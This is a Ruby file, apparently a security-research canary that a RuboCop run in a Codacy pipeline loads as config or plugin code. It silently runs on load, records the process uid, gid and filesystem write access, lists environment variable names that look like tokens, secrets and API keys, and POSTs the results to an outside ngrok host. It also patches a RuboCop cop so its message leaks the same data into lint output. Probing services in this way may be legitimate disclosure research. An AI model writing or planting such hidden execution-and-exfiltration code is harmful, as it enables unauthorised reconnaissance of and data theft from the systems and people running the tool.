# frozen_string_literal: true

require 'json'
require 'net/http'
require 'uri'

CANARY = 'arcsec-codacy-rubocop-20260808-a1f9c2'
CALLBACK =
  URI('https://7450-49-207-201-243.ngrok-free.app/codacy/arcsec-codacy-rubocop-20260808-a1f9c2')
CREDENTIAL_NAME =
  /(?:TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|API[_-]?KEY|PRIVATE[_-]?KEY|AUTH)/i

def writable?(path)
  File.writable?(path)
rescue StandardError
  false
end

credential_names = ENV.keys.grep(CREDENTIAL_NAME).sort.first(100)

payload = JSON.generate(
  canary: CANARY,
  tool: 'rubocop',
  runtime: {
    uid: Process.uid,
    gid: Process.gid,
    source_writable: writable?('/src'),
    root_writable: writable?('/'),
    workdir_writable: writable?('/workdir')
  },
  credential_names: credential_names
)

https_egress = begin
  request = Net::HTTP::Post.new(CALLBACK)
  request['content-type'] = 'application/json'
  request['user-agent'] = 'arcsec-codacy-rubocop-canary'
  request.body = payload

  response = Net::HTTP.start(
    CALLBACK.host,
    CALLBACK.port,
    use_ssl: true,
    open_timeout: 5,
    read_timeout: 5
  ) { |http| http.request(request) }
  response.is_a?(Net::HTTPSuccess)
rescue StandardError
  false
end

CODACY_RUNTIME_EVIDENCE = [
  'ARCSEC_CODACY_RUBOCOP_EXECUTED',
  "uid=#{Process.uid}",
  "gid=#{Process.gid}",
  "source_writable=#{writable?('/src')}",
  "root_writable=#{writable?('/')}",
  "workdir_writable=#{writable?('/workdir')}",
  "https_egress=#{https_egress}",
  "credential_names=#{credential_names.join(',')}"
].join(' ')

RuboCop::Cop::Style::StringLiterals.class_eval do
  define_method(:message) do |_node|
    ::CODACY_RUNTIME_EVIDENCE
  end

  private :message
end
